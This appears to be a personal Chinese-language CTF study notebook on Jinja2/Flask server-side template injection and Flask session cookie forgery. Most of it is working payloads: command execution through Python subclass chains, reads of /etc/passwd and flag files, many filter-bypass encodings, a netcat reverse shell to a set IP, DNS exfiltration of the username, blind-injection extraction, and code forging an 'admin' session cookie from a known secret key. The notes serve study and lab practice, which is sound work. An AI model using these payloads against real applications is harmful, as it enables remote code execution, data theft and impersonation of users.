    #     if res3.text != "Hello " and res3.text != "No this level":
    #         print(html.fromstring(res3.text).text.replace("\n", "【回车】"))
    #         break

    # # 查看某个类的__globals__
    # data_globals = {
    #     'code': "{{().__class__.__bases__[0].__subclasses__()[" + str(133) + "].__init__.__globals__}}"
    # }
    #
    # res3 = requests.post(url=url, data=data_globals, headers=headers)
    # if res3.text != "Hello " and res3.text != "No this level":
    #     print(html.fromstring(res3.text).text.replace("\n", "【回车】"))

```

![image-20230729181809015](daydayup.assets/image-20230729181809015.png)

```
<class 'os._wrap_close'>类：
利用popen()执行命令：().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('whoami').read()
利用system()执行命令：().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['system']('ping 78319.UOFOS5Q7RU.dns.xms.la')

通过__builtins__获取内置方法，能够调用__builtins__即可，测试很多类都能够调用：
利用eval()执行命令：().__class__.__bases__[0].__subclasses__()[465].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat ./flag").read()')
通过open()查看flag：().__class__.__bases__[0].__subclasses__()[465].__init__.__globals__['__builtins__']['open']('./flag', 'r').read()

<class 'subprocess.Popen'>类：
利用subprocess.run()执行命令：().__class__.__bases__[0].__subclasses__()[396].__init__.__globals__['run']('whoami', capture_output=True, text=True).stdout
利用subprocess.Popen()执行命令：().__class__.__bases__[0].__subclasses__()[396].__init__.__globals__['Popen'](["touch", "./456"])

<class '_frozen_importlib.BuiltinImporter'>类：
利用load_module()加载模块os进行执行命令：().__class__.__bases__[0].__subclasses__()[84]['load_module']("os")["popen"]("ls").read()

利用linecache函数执行命令，有几个类都有这个函数：
linecache()这个函数中也引入了os模块：().__class__.__bases__[0].__subclasses__()[259].__init__.__globals__['linecache'].os.popen('dir').read()

<class '_frozen_importlib_external.FileLoader'>类：
通过get_data函数读取文件内容：().__class__.__bases__[0].__subclasses__()[94]["get_data"](0, "/etc/passwd")

os模块执行命令:
通过config，调用os模块：config.__class__.__init__.__globals__['os'].popen('whoami')
通过url_for，调用os：{url_for.__globals__.os.popen('whoami').read()
在已经加载os模块的子类里直接调用os模块：''.__class__.__bases__[0].__subclasses__()[341].__init__.__globals__['os'].popen("ls -l").read()
```

`subprocess.Popen()`![image-20230729180632010](daydayup.assets/image-20230729180632010.png)

`os.system()`
![image-20230729182735682](daydayup.assets/image-20230729182735682.png)

`linecache()`执行命令
![image-20230729191643448](daydayup.assets/image-20230729191643448.png)

![image-20230729192011745](daydayup.assets/image-20230729192011745.png)

解析`{{().__class__.__bases__[0].__subclasses__()[%i].__init__.__globals__['__builtins__']}}`
![image-20230729184733593](daydayup.assets/image-20230729184733593.png)

>`__class__.__base__.__subclasses__()` 列表中通常不会包含 `file` 类的子类，因为在 Python 3 中，`file` 类已经被移除，不再是内置类型。
>
>在早期版本的 Python（Python 2.x）中，`file` 类用于表示文件对象，并作为内置的文件 I/O 类型。但从 Python 3 开始，`file` 类被替代为内置的 `io` 模块中的 `io.TextIOWrapper` 和 `io.BufferedIOBase` 等类。
>
>在 Python 3 中，文件 I/O 操作应该使用 `open()` 函数来打开文件，而不是直接使用 `file` 类。`open()` 函数返回一个文件对象，它是 `io.TextIOWrapper` 或 `io.BufferedIOBase` 的实例，可以用于进行文件读写操作。

>```
><class '_frozen_importlib.BuiltinImporter'>类：
>利用load_module()加载模块os进行执行命令：().__class__.__bases__[0].__subclasses__()[84]['load_module']("os")["popen"]("ls").read()
>```
>
>这里的`load_module`是一个静态方法，所以能够直接通过类调用而不用实例化对象

#### {% %}使用

```python
print(
    Template('''
        {% for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close" %}
            {{ i.__init__.__globals__['system']('whoami') }} 
        {% endfor %}
    ''').render()
)
```

{% %}是属于flask的控制语句，且以{% end.. %}结尾，可以通过在控制语句，定义变量或者写循环，判断。

index.html

```html
<!DOCTYPE html>
<html>
<head>
    <title>{{ title }}</title>
</head>
<body>
    <h1>{{ heading }}</h1>
    <ul>
        {% for item in items %}
			{% if item == "wi1shu" %}
				<li>This is {{ item }}</li>
			{% else %}
				<li>{{ item }}</li>
			{% endif %}
        {% endfor %}
    </ul>
</body>
</html>
```

app.py

```python
from flask import Flask, render_template
from jinja2 import Template

app = Flask(__name__)


@app.route('/')
def main():
    return render_template('index.html', title='My Page', heading='Welcome to My Page', items=['Apple', 'Banana', 'Orange'])


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=50000)
```

设置变量

```jinja2
{% set a = 'Apple' %}
{{ a }}
```

利用方式

由于模板语法对 Python 语句是有一定程度支持的，所以可以这样利用：

```python
@app.route('/demo1/')
def demo1():
    payload = Template('''
        {% for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close" %}
            {% set wi1 = i.__init__.__globals__['popen']('whoami').read() %} 
            {{wi1}}
        {% endfor %}
    ''').render()
    return payload
```

但并不是完全支持 Python 所有的语法，所以很多语法是无法使用的，比如列表推导式

```python
try:
    print(Template('''
        {{ [i for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close"][0].__init__.__globals__['system']('whoami') }}
        ''').render())
except Exception:
    print(traceback.format_exc())
```

会报错：`jinja2.exceptions.TemplateSyntaxError: expected token ',', got 'for'`

### waf绕过

#### 绕过数字、字符

沙箱逃逸中的`[ ]` 扣字符拼接、`chr` 等。

1. 数字 0：`{{ {}|int }}`、`{{ {}|length }}`
2. 数字 1：`{{ ({}|int)**({}|int) }}`
3. 数字 2：`dict(e='a',a=1)|join|count`
4. 理论上有了 1 之后就可以搞出所有其他数字，可以用 `+` 或者是 `-`+`|abs`
5. 空格：`{{ {}|center|last }}`、`{1:1}|xmlattr|first`
6. `<`：`{}|select|string|first`
7. `F>`：`{}|select|string|last`
8. 点：`{{ self|float|string|min }}` 或者 `config['__lt__']|string|truncate(3)|frist`
9. `a-z`：`{{ range.__doc__ + dict.__doc__}}`
10. `A-Z`：`{{ (range.__doc__ + dict.__doc__) | upper }}`

上面这种都比较常规，思路还是扣字符的思路，顶多是过滤器做了变化。

这里多说一下利用格式化字符串实现的任意字符构造（例如字符 `d`）：

1. 首先搞出 `%c`：`{{ {}|string|urlencode|first~(self|string)[16] }}`
2. 然后搞出 `d`：`{{ ({}|string|urlencode|first~(self|string)[16]) % 100 }}`

还不需要引号。

>`__lt__` 是Python中用于比较“小于”操作的特殊方法名。
>
>`<bound method Undefined._fail_with_undefined_error of Undefined>`：这个错误信息是由Jinja2模板引擎的Undefined对象引起的。当在模板中引用了一个未定义的变量或对象时，Jinja2会将其表示为Undefined对象，以便在模板渲染过程中进行处理。
>
>`truncate()` 过滤器用于截断字符串并添加省略号。它可以将一个较长的字符串截断为指定的长度，并在截断处添加省略号以表示字符串被截断了。[Flask中truncate过滤器无效，不起作用的问题，truncate详解-CSDN博客](https://blog.csdn.net/yueguangMaNong/article/details/85196199)
>
>`{{"Hello, World!"|truncate(6)}}` -> `Hel...`

>`xmlattr()` 是Jinja2中的一个过滤器，用于将字典中的键值对转换为XML属性字符串。
>
>```python
>person = {
>    'name': 'Alice',
>    'age': 30
>}
>```
>
>`<person {{ person|xmlattr }}>...</person>` 渲染后-> `<person name="Alice" age="30">...</person>`

>`self`：在Jinja2模板中，`self` 表示当前上下文中的对象。`self` 只在自定义过滤器和函数中可用，而在模板中不可用。在模板中，可以直接引用传递给模板的变量和上下文中的属性。

>`~` 是字符串拼接运算符。它用于连接两个字符串并生成一个新的字符串。
>
>![image-20230803023115250](daydayup.assets/image-20230803023115250.png)

或者还有借助`request`对象，`request.args` 是flask中的一个属性,为返回请求的参数,这里把 path 当作变量名,将后面的路径传 值进来,进而绕过了引号的过滤

`{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40) (request.args.path).read() }}&path=/etc/passwd`

`request`还有以下几种

```
request.args.name
request.cookies.name
request.headers.name
request.values.name
request.form.name
```

payload如下

GET方式，利用request.args传递参数

`{{().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()}}`
``&arg1=open&arg2=/etc/passwd`
POST方式，利用request.values传递参数

`{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()}}`
`post:arg1=open&arg2=/etc/passwd`
Cookie方式，利用request.cookies传递参数

`{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()}}``
``Cookie:arg1=open;arg2=/etc/passwd`

#### 获取内置函数

列如获取`chr`

```
{{().__class__.__base__.__subclasses__()[100].__init__.__globals__["__builtins__"]["chr"]}}
```

如果你觉得每次调用都需要这样写，太麻烦了，payload 也冗余，那么就可以结合 `{% set ... %}`：

```
{% set chr = ().__class__.__base__.__subclasses__()[100].__init__.__globals__["__builtins__"]["chr"]%}

{{ chr(97)~chr(98) }}
```

结合宏：

```
{%- macro chr(i) -%}
    {{().__class__.__base__.__subclasses__()[100].__init__.__globals__["__builtins__"]["chr"](i)}}
{%- endmacro -%}

{{ chr(97)~chr(98) }}
```

由于 jinja2 中有自己的一些内置变量等，所以会有一些资料 2 之外的姿势。例如利用 `Undefined` 实例可以直接拿到 `__globals__`：

```
{{ x.__init__.__globals__ }}
```

![image-20230803172419855](daydayup.assets/image-20230803172419855.png)

所以就可以有：

- `x.__init__.__globals__.__builtins__`
- `x.__class__.__init__.__globals__.__builtins__.eval`
- `x.__init__.__globals__.__builtins__.eval`
- `x.__init__.__globals__.__builtins__.exec`
- `x.__init__.__globals__.sys.modules.os`
- `x.__init__.__globals__.__builtins__.__import__`
- ...

通过查阅源码或者文档可知，默认命名空间自带这几种函数

![image-20230803173842159](daydayup.assets/image-20230803173842159.png)

或者用 `self.__dict__._TemplateReference__context` 也可以看到。

![image-20230803173407425](daydayup.assets/image-20230803173407425.png)

所以就有：

1. `self.__init__.__globals__`
2. `lipsum.__globals__.os`
3. `cycler.__init__.__globals__.os`
4. `joiner.__init__.__globals__.os`
5. `namespace.__init__.__globals__.os`

其实这些随便找个方法都可以搞到 `__globals__`。那为啥其他的比如 `range` 就不可以呢？

>我给出的解释：`range`是Python的内置函数，在Python的C语言实现中被定义
>
>`__globals__`是一个特殊的属性，是Python函数特有的。它是函数对象的一个内部属性，是一个字典，包含了函数被定义时的全局命名空间。这个命名空间包含了函数能够访问的所有全局变量。
>
>`__globals__`对于内置函数如`range`是不可用的，因为它们是在C语言级别实现的，而不是Python代码。对于内置的C语言函数，或者其他非函数对象，这个属性是不存在的。
>
>`range`，`dict`等是Python的内置函数，它们在Python的C语言实现中被定义，因此它们没有`__globals__`属性。
>
>而`generate_lorem_ipsum`，`Cycler`，`Joiner`，`Namespace`等是Python代码定义的函数或类，它们在定义时会捕获全局命名空间，因此有`__globals__`属性。
>
>![image-20230803180406037](daydayup.assets/image-20230803180406037.png)

#### 过滤`.`

在Python沙箱逃逸中，过滤了 `.`，用 `getattr()`

在 jinja2 中，由于 `[key]` 的特殊性，`[key]` 和 `.` 是基本上等价的，只是处理逻辑先后上有区别，`.` 是先按查找属性执行，再按照用键查字典的值去执行，`[key]` 则相反。并且还提到，如果想查找属性还可以用 `attr()`。

- `{{ 1["__class__"] }}`
- `{{ 1 | attr("__class__") }}`

由于过滤器 `map` 也支持取属性，所以可以这样

```
# 注意，由于 map 需要一个可迭代对象，所以外面需要套个 [ ]
# 当使用 map 过滤器时，可以通过 attribute 参数来指定要调用的属性或方法。
{{ [1] | map(attribute="__class__")| list | first }}

{{ [1, [], '', (), {}] | map(attribute="__class__")| list }}
# [<class 'int'>, <class 'list'>, <class 'str'>, <class 'tuple'>, <class 'dict'>]
```

#### 过滤`[]`

*[这里](#过滤[])

除了这里的之外，在取字典里的数据的时候，也可以根据上述的结论，用`.`代替`[]`也可以`{{ {"a": 1}.a }}`

如果是要构造一个列表，我们一般是给最外面加个 `[]` 就好了。在中括号被过滤的情况下，则可以使用 `slice` 来替代。例如 `"1"|slice(1)|list` 与 `[['1']]` 是等价的。

>`slice(value,slices,fill_width=None)`：切片,接受一个可迭代对象,返回slices指定份数,不足n个使用fill_width指定的对象进行填充
>
>- slice() 过滤器可以切割迭代器(比如列表),返回二维列表。
>- 传入切割份数量(这里是3),可以将迭代器均分为多份。
>- 在循环中可以迭代这些份,实现分列展示等效果。
>- 第二个参数用于填充最后一列缺失数据。
>
>```jinja2
>{% set my_list = [1, 2, 3, 4, 5] %}
>{{ my_list|slice(4)|list }}
># [[1, 2], [3], [4], [5]]
>
>{% set my_list = [1, 2, 3, 4, 5] %}
>{{ my_list|slice(3)|list }}
># [[1, 2], [3, 4], [5]]
>
>{{ 'abcdefghijklmn'|slice(6)|list }}
># [['a', 'b', 'c'], ['d', 'e', 'f'], ['g', 'h'], ['i', 'j'], ['k', 'l'], ['m', 'n']]
>
>{{ 'abcdefghijklmn'|slice(20)|list }}
># [['a'], ['b'], ['c'], ['d'], ['e'], ['f'], ['g'], ['h'], ['i'], ['j'], ['k'], ['l'], ['m'], ['n'], [], [], [], [], [], []]
>
>{{ 'abcdefghijklmn'|slice(20) }}
># <generator object sync_do_slice at 0x000001CD94C3B7B0>
>```

####  过滤 `{{ }}`

利用 `{% %}`。

首先是`{% macro %}`

`{% print(...) %}`：

```
{% print(''.__class__.__mro__[-1].__subclasses__()[135].__init__.__globals__['popen']("whoami")).read() %}
```

还有 `{% if %}`、`{% set %}`、`{% for %}` ... 都是可以执行命令的，只是无回显。如果非要有回显，可以外带数据，或者盲注，或者直接反弹shell

外带数据：

```jinja2
 {% for subclass in dict.mro()[-1].__subclasses__()%}
    {% if subclass.__name__ == '_wrap_close' %}
        {%set a = subclass.__init__.__globals__.popen('ping %USERNAME%.0JV612R1Y5.dns.xms.la').read()%}
    {% endif %}
 {% endfor %}
```

![image-20230803202623360](daydayup.assets/image-20230803202623360.png)

>windows常用变量：
>
>- //变量                              类型    描述
>- //%ALLUSERSPROFILE%              本地    返回“所有用户”配置文件的位置。
>- //%APPDATA%          　           本地    返回默认情况下应用程序存储数据的位置。
>- //%CD%                            本地    返回当前目录字符串。
>- //%CMDCMDLINE%                   本地    返回用来启动当前的 Cmd.exe 的准确命令行。
>- //%CMDEXTVERSION%               系统    返回当前的“命令处理程序扩展”的版本号。
>- //%COMPUTERNAME%               系统    返回计算机的名称。
>- //%COMSPEC%                      系统    返回命令行解释器可执行程序的准确路径。
>- //%DATE%                          系统    返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。
>- //%ERRORLEVEL%                   系统    返回上一条命令的错误代码。通常用非零值表示错误。
>- //%HOMEDRIVE%                    系统    返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
>- //%HOMEPATH%                     系统    返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
>- //%HOMESHARE%                   系统    返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
>- //%LOGONSERVER%                 本地    返回验证当前登录会话的域控制器的名称。
>- //%NUMBER_OF_PROCESSORS%      系统    指定安装在计算机上的处理器的数目。
>- //%OS%                            系统    返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。
>- //%PATH%                          系统    指定可执行文件的搜索路径。
>- //%PATHEXT%                       系统    返回操作系统认为可执行的文件扩展名的列表。
>- //%PROCESSOR_ARCHITECTURE%    系统    返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。
>- //%PROCESSOR_IDENTFIER%        系统    返回处理器说明。
>- //%PROCESSOR_LEVEL%            系统    返回计算机上安装的处理器的型号。
>- //%PROCESSOR_REVISION%         系统    返回处理器的版本号。
>- //%PROMPT%                       本地    返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。
>- //%RANDOM%                      系统    返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。
>- //%SYSTEMDRIVE%                 系统    返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。
>- //%SYSTEMROOT%                 系统    返回 Windows server operating system 根目录的位置。
>- //%TEMP%和%TMP%                系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。
>- //%TIME%                          系统    返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。
>- //%USERDOMAIN%                  本地    返回包含用户帐户的域的名称。
>- //%USERNAME%                    本地    返回当前登录的用户的名称。
>- //%USERPROFILE%                 本地    返回当前用户的配置文件的位置。
>- //%WINDIR%                       系统    返回操作系统目录的位置。

反弹shell：

*[这里](#反弹shell)

```
{% for subclass in dict.mro()[-1].__subclasses__()%}
    {% if subclass.__name__ == '_wrap_close' %}
        {% set a = subclass.__init__.__globals__.popen("netcat 192.168.159.128 5478 -e /bin/bash") %}
    {% endif %}
 {% endfor %}
```

盲注：

布尔盲注

```
{% if dict.mro()[-1].__subclasses__()[134].__init__.__globals__.popen('whoami').read()[0] == "a" %}a{% endif %}
{% if dict.mro()[-1].__subclasses__()[134].__init__.__globals__.popen('whoami').read()[0] == "b" %}b{% endif %}
{% if dict.mro()[-1].__subclasses__()[134].__init__.__globals__.popen('whoami').read()[0] == "d" %}d{% endif %}
# 输出d 说明第一个字符是d
```

时间盲注

```
{% if dict.mro()[-1].__subclasses__()[133].__init__.__globals__.system('sleep $(whoami | cut -c 1 | tr a 2)') %}{% endif %}
{% if dict.mro()[-1].__subclasses__()[133].__init__.__globals__.system('sleep $(whoami | cut -c 1 | tr b 2)') %}{% endif %}
...
{% if dict.mro()[-1].__subclasses__()[133].__init__.__globals__.system('sleep $(whoami | cut -c 1 | tr s 2)') %}{% endif %}
# 延时 2s 说明第一个字符是 s
```

>1. `cut -c 1`: `cut` 是一个文本处理工具，`-c` 选项用于按字符进行切割。这里 `-c 1` 表示只取每行的第一个字符。
>2. `tr a 1`: `tr` 是另一个文本处理工具，用于字符替换。`a` 被替换成 `2`，意味着如果用户名的首字母是小写字母 `a`，那么它会被替换成数字 `2`。
>3. `sleep $(...)`: 这是 `sleep` 命令，用于让程序休眠一段时间。`$()` 是命令替换的语法，它会先执行括号中的命令，然后将结果作为参数传递给 `sleep` 命令。在这里，`sleep` 命令将等待的时间设置为之前处理后的结果。

甚至可以搞基于报错的盲注：

```
{% for i in [1][(dict.mro()[-1].__subclasses__()[133].__init__.__globals__.popen('whoami').read()[0] == "a")|int] %}{% endfor %}

{% for i in [1][(dict.mro()[-1].__subclasses__()[133].__init__.__globals__.popen('whoami').read()[0] == "s")|int] %}{% endfor %}
# 不报错说明第一个字符是 s
```

因为对于 jinja2 来说，索引过大是返回 Undefined，不会报错。

![image-20230803220454065](daydayup.assets/image-20230803220454065.png)

#### 限制过滤器或函数

姿势主要有三种：

1. 有些过滤器是可以被替换的，比如 `[]|string` 等同于 `[]|format`。这种方式主要依赖于使用过滤器的目的，不太好列出统一的替换规则，所以我就不一一列举了。熟悉各种过滤器的作用是这种 bypass 的前提。

2. 大部分过滤器可以转为 `[]` 嵌套 + `map()` 来使用。例如 `123|string` 等同于 `[123]|map("str""ing")|list|last`。这种姿势相对来说通用，遗憾的是，无法带参数使用过滤器。

   >`map()` ：它可以将一个函数或过滤器映射到一个序列或对象列表上。
   >
   >`map()`的基本语法是:
   >
   >```
   >{{ sequence|map(attribute) }}
   >
   >{{ sequence|map('filtername') }}
   >```
   >
   >`map()`有两种主要用法:
   >
   >- 查找属性:
   >
   >```
   >{% set users = [user1, user2, user3] %}
   >{{ users|map(attribute='username') }}
   >```
   >
   >这将提取每个user对象的username属性,返回一个username的列表。
   >
   >- 应用过滤器:
   >
   >```
   >{{ titles|map('lower') }}
   >```
   >
   >这将lower过滤器应用到titles序列的每个元素上。
   >
   >map()通常结合join等过滤器处理结果:
   >
   >```
   >{{ users|map(attribute='username')|join(', ') }}
   >```

3. `self.__dict__._TemplateReference__context` 中包含了内置的全局函数，可以直接用

4. 拼接

   ```python
   {{().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('who'+'ami').read()}}
   {{().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['po'+'pen']('who'+'ami').read()}}
   ```

   Unicode编码

   ```python
   {{().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['\u0070\u006f\u0070\u0065\u006e']('\u0077\u0068\u006f\u0061\u006d\u0069').read()}}
   ```

   十六进制编码

   ```python
   {{().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['\x70\x6f\x70\x65\x6e']('\x77\x68\x6f\x61\x6d\x69').read()}}
   ```

   引号绕过

   ```python
   {{().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['pope''n']('wh''oami').read()}}
   ```

   利用dict绕过

   ```python
   {{dict(__in=a,it__=a)|join}}  =__init__
   ```

   例如 `whoami`：

   - `{{ dict(whoami=x)|join }}`
   - `{{ dict(who=x,ami=x)|join }}`
   - `{{ dict(whoami=x)|list|first }}`
   - `{{ dict(whoami=x)|items|list|first|first }}`

#### py3.9新特性

>`<class 'types.GenericAlias'>` 是 Python 3.9 中引入的一个新的类型，用于表示泛型别名。
>
>在 Python 3.9 之前，泛型的类型注解是使用 `typing` 模块中的类和类型变量来实现的。例如，你可以使用 `List[int]` 表示整数列表，或者 `Dict[str, int]` 表示键为字符串、值为整数的字典。
>
>然而，Python 3.9 引入了新的泛型类型系统，使用 `types.GenericAlias` 类来表示泛型别名。这个类的作用是创建一个通用的别名，可以用来表示各种不同的泛型类型。
>
>例如，`list[int]` 在 Python 3.9 中将被表示为 `<class 'types.GenericAlias'>`。
>
>下面是一个例子，演示如何在 Python 3.9 中使用泛型别名：
>
>```
>from __future__ import annotations
>from typing import List
>
># 在 Python 3.9 中，List[int] 将被表示为 <class 'types.GenericAlias'>
>my_list: List[int] = [1, 2, 3]
>
>print(type(my_list))
>```
>
>输出将会是：
>
>```
><class 'list'>
>```
>
>在 Python 3.9 中，类型注解默认情况下是延迟评估的（通过 `from __future__ import annotations` 实现）。这意味着在类型注解中使用的类型名称将被表示为泛型别名 `<class 'types.GenericAlias'>`，但在运行时会被解析为其实际类型，比如上述例子中的 `List[int]` 最终会在运行时被解析为普通的 Python 列表类型 `list`。
>
>在 Python 3.9 之前，类型注解的解析是即时发生的。也就是说，在你定义一个变量或函数时，类型注解会立即被解析，并与相应的类型绑定。这可能会导致一些循环引用或其他复杂的类型注解的情况下出现问题。
>
>Python 3.9 引入了 `from __future__ import annotations` 语法特性。这个特性使得类型注解在默认情况下是延迟评估的，也称为前向声明。
>
>延迟评估意味着在解析类型注解时，不会立即对类型表达式进行求值和绑定。相反，类型表达式会被视为字符串，直到需要时才进行实际的类型解析。这使得 Python 解释器能够更好地处理复杂的类型注解，避免了循环引用等问题。
>
>在使用泛型别名时，你可以使用各种泛型类型，例如 `Union`、`Dict`、`Tuple` 等，以及自定义的泛型类型别名。

打印 `list[int]` 的结果是 `list[int]`，它其实是一个 `GenericAlias`：

![image-20230803230539610](daydayup.assets/image-20230803230539610.png)

`list["whoami"]`，加上 jinja2 的 `.` 的特殊性，即可这样：

```
{{dict.mro()[-1].__subclasses__()[134].__init__.__globals__.popen((dict.whoami|string)[6:-2]|join).read()}}
```

利用相同的逻辑，我们可以找出其他 bypass 的姿势，其实都是利用了 `__class_getitem__`，再想办法把结果变成 str 类型：

1. `(dict.whoami|string)[6:-2]|join`
2. `(dict.whoami|title...`
3. `(dict.whoami|trim...`
4. `(dict.whoami|lower...`
5. `(dict.whoami|center...`
6. `(dict.whoami|format...`
7. `(dict.whoami|capitalize...`
8. `(dict.whoami|indent)[6:-2]|join`

下面这些会用到引号，所以可能并不实用：

1. `(dict.whoami|string).split("'").pop(-2)`
2. `(dict.whoami|replace("", "").pop(-2)`
3. `("00"|join(dict.whoami)).split("'").pop(-2)`
4. `(dict.whoami|urlize).split("'").pop(-2)`
5. `(dict.whoami|urlencode).split("%27").pop(-2)`

上面这么多都是类似的逻辑。如果出现过滤器禁用的情况，可以互相做替换。

组合之前的一些技巧，还可以这样：

1. 引号、`[ ]` 被过滤：`(dict.whoamiiii|string|slice(3)|list).pop(1)|join`（或者挨个 pop 完之后拼接起来，就是会比较长）
2. 引号、数字、`[ ]` 被过滤：`(dict.whoamiiii|string|slice(True+True+True)|list).pop(True)|join`

下面这些可能都不实用，但是作为技巧看一下还是挺有启发的：

```
# . 被过滤
([dict]|map(attribute='whoami')|list|string)[7:-3]

# 特定的过滤器被禁用
(([dict.whoamiiii|string]|list|map("sl"+"ice", 3)|list).pop(0)|list).pop(1)|join

# [] 被过滤 + 特定的过滤器被禁用
(((""|slice(1,fill_with=(dict.whoamiiii|string))|list).pop()|map("sl"+"ice", 3)|list).pop(0)|list).pop(1)|join
```

**自然，这个技巧只有 > py3.9 才可以使用。**

从上面可以看出，这个姿势要实用，很依赖 `.`，如果这个被干掉了那就要换其他的姿势了

## Python urllib CRLF漏洞(CVE-2019-9740和CVE-2019-9947)



## Python Flask框架相关

### session 信息泄露 & 伪造

[SecMap - Flask - Tr0y's Blog](https://www.tr0y.wang/2022/05/16/SecMap-flask)

session 的作用大家都比较熟悉了，就不用介绍了。

它的常见实现形式是当用户发起一个请求的时候，后端会检查该请求中是否包含 sessionid，如果没有则会创造一个叫 sessionid 的 cookie，用于区分不同的 session。sessionid 返回给浏览器，并将 sessionid 保存到服务器的内存里面；当已经有了 sessionid，服务端会检查找到与该 sessionid 相匹配的信息直接用。

所以显而易见，session 和 sessionid 都是后端生成的。且由于 session 是后端识别不同用户的重要依据，而 sessionid 又是识别 session 的唯一依据，所以 session 一般都保存在服务端避免被轻易窃取，只返回随机生成的 sessionid 给客户端。对于攻击者来说，假设需要冒充其他用户，那么必须能够猜到其他用户的 sessionid，这是比较困难的。

对于 flask 来说，它的 session 不是保存到内存里的，而是直接把整个 session 都塞到 cookie 里返回给客户端。那么这会导致一个问题，如果我可以直接按照格式生成一个 session 放在 cookie 里，那么就可以达到欺骗后端的效果。

阅读源码可知，flask 生成 session 的时候会进行序列化，主要有以下几个步骤：

1. 用 `json.dumps` 将对象转换成 json 字符串
2. 如果第一步的结果可以被压缩，则用 zlib 库进行压缩
3. 进行 base64 编码
4. 通过 secret_key 和 hmac 算法（flask 这里的 hmac 默认用 sha1 进行 hash，还多了一个 salt，默认是 `cookie-session`）对结果进行签名，将签名附在结果后面（用 `.` 拼接）。如果第二步有压缩的话，结果的开头会加上 `.` 标记。

可以看到，最后一步解决了用户篡改 session 的安全问题，因为在不知道 secret_key 的情况下，是无法伪造签名的。

所以这会直接导致 2 个可能的安全问题：

1. 数字签名的作用是防篡改，没有保密的作用。所以 flask 的 session 解开之后可以直接看到明文信息，可能会导致数据泄露
2. 如果知道 secret_key 那么可以伪造任意有效的 session（这个说法并不完全准确）

>[noraj/flask-session-cookie-manager: :cookie: Flask Session Cookie Decoder/Encoder (github.com)](https://github.com/noraj/flask-session-cookie-manager)

```python
from flask import Flask, session


app = Flask(__name__)
app.secret_key = 'wi1shu'

@app.route('/')
def hello():
    if session.get("user", None):
        user = session.get("user", None)
    else:
        session['user'] = user = 'user'
    return f'Welcome, {user}!'


app.run(debug=True, port=50001)
```

![image-20231210163520237](daydayup.assets/image-20231210163520237.png)

session为`eyJ1c2VyIjoidXNlciJ9.ZXV4OA.63R_94KNDsPsTIwGayzQBi6B2y4`，可以通过flask-session-cookie-manager-master将其解码或者自行进行base64解码

![image-20231210163933696](daydayup.assets/image-20231210163933696.png)

>`URLSafeTimedSerializer` 是 Flask-WTF 库中的一个类，用于生成和验证包含时间戳的 URL 安全的序列化（serialized）令牌。它主要用于在 Web 应用中处理安全性相关的功能，例如生成带有时效性的重置密码链接或身份验证令牌。
>
>`URLSafeTimedSerializer` 的作用：
>
>1. **生成 URL 安全的令牌：** 通过将数据序列化并附加时间戳，生成一个 URL 安全的字符串令牌。这个令牌可以包含一些信息（如用户 ID、操作类型等），并且由于是 URL 安全的，可以方便地用于构建重置密码链接或其他包含敏感信息的 URL。
>2. **验证令牌的有效性和时效性：** 可以通过令牌的解析来验证令牌的有效性和时效性。这有助于确保令牌在一段时间后过期，从而提高安全性。一旦令牌过期，就不能再被验证。
>
>```python
>from flask import Flask
>from itsdangerous import URLSafeTimedSerializer
>
>app = Flask(__name__)
>app.config['SECRET_KEY'] = 'wi1shu'
>
>serializer = URLSafeTimedSerializer(app.config['SECRET_KEY'])
>
># 生成令牌
>user_id = 123
>token = serializer.dumps(user_id, salt='reset-password')
>
># 验证令牌
>try:
>    data = serializer.loads(token, salt='reset-password', max_age=3600)  # 令牌有效期为 1 小时
>    print(f"Valid token. User ID: {data}")
>except:
>    print("Invalid or expired token.")
>```

可利用URLSafeTimedSerializer进行解码与编码，也可以利用flask-session-cookie-manager-master

```python
from itsdangerous import URLSafeTimedSerializer, base64_decode, encoding

session = "eyJ1c2VyIjoidXNlciJ9.ZXV4OA.63R_94KNDsPsTIwGayzQBi6B2y4"
session_list = session.split(".")

print(base64_decode(session_list[0]))
# b'{"user":"user"}'

print(base64_decode(session_list[1]))
# b'eux8'

# 验证session
print(URLSafeTimedSerializer('wi1shu',
                             salt="cookie-session", # 默认值
                             signer_kwargs={"key_derivation": "hmac"}
                             ).loads_unsafe(session))
# (True, {'user': 'user'})

# 生成session
print(URLSafeTimedSerializer('wi1shu',
                             salt="cookie-session",  # 默认
                             signer_kwargs={"key_derivation": "hmac"}
                             ).dumps({'user': 'admin'}))
# eyJ1c2VyIjoiYWRtaW4ifQ.ZXV76w.jvG0kY94ZYQ2fVYDnwebKFD4Ny8
```

```
利用flask-session-cookie-manager-master
